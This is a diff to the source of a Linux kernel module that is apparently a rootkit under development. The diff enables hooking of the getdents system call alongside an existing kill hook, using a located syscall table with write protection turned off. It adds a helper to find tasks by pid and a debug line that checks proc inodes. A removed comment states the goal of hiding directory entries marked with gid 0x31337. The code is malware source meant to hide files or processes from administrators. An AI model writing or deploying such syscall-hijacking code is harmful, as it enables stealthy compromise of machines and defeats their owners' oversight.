@@ -16,6 +16,7 @@
 #include <linux/fs_struct.h>
 #include <linux/stat.h>
 #include <linux/namei.h>
+#include <linux/fdtable.h>
 
 MODULE_LICENSE("GPL");
 
@@ -87,6 +88,18 @@ sudo rmmod lkm
 Makefile  lkm  lkm.ko
 */
 
+struct task_struct *get_task(pid_t pid) //get task_struct from pid, if in PROC
+{
+ struct task_struct *p = current;
+ do {
+  if (p->pid == pid)
+   return p;
+   p = next_task(p);
+  }
+  while (p != current);
+  return NULL;
+}
+
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
@@ -109,8 +122,8 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
-        //want to somehow get the gid of the current dirent. if == 0x31337 then hide
-        //get struct file then ->f_dentry->d_inode
+        printk("%d",((unsigned long *)current->files->fd_array[fd]->f_path.dentry->d_inode->i_ino)==PROC_ROOT_INO);
+        //nd->d_name file name
         bpos += d->d_reclen; //next
     }
     copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace
@@ -125,10 +138,10 @@ static int init(void) { //initial function, sets up syscall hijacking
     if (!syscall_table) {cleanup_module(); } //if find() fails, unload
     //have to disable previous line otherwise you can't unload module without rebooting
     original_kill = (void *)syscall_table[__NR_kill]; //store old addresses
-    //original_getdents = (void *)syscall_table[__NR_getdents];
+    original_getdents = (void *)syscall_table[__NR_getdents];
     //original_getdents64 = (void *)syscall_table[__NR_getdents64];
     GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
-    //syscall_table[__NR_getdents] = new_getdents;
+    syscall_table[__NR_getdents] = (address)new_getdents;
     syscall_table[__NR_kill] = (address)new_kill;
     //syscall_table[__NR_getdents64] = new_getdents64;
     GPF_ENABLE;
@@ -138,7 +151,7 @@ static int init(void) { //initial function, sets up syscall hijacking
 void cleanup_module(void) {
     GPF_DISABLE;
     syscall_table[__NR_kill] = (address)original_kill; //corrects the hijacking on unload
-    //syscall_table[__NR_getdents] = original_getdents;
+    syscall_table[__NR_getdents] = (address)original_getdents;
     //syscall_table[__NR_getdents64] = original_getdents64;
     GPF_ENABLE;
     return;
